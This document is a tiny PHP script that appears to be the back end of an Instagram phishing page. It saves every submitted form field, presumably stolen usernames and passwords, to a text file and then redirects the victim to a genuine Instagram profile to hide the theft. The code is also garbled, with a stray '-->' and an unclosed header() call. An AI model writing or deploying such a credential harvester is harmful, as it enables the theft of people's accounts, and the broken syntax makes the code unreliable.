<?php
 $fichier = fopen('usernames.txt', 'r+');
 file_put_contents('usernames.txt', print_r($_POST, true));
 fclose($fichier); -->
 header('Location: https://www.instagram.com/thelinuxproject/?hl=fr'
 ?>
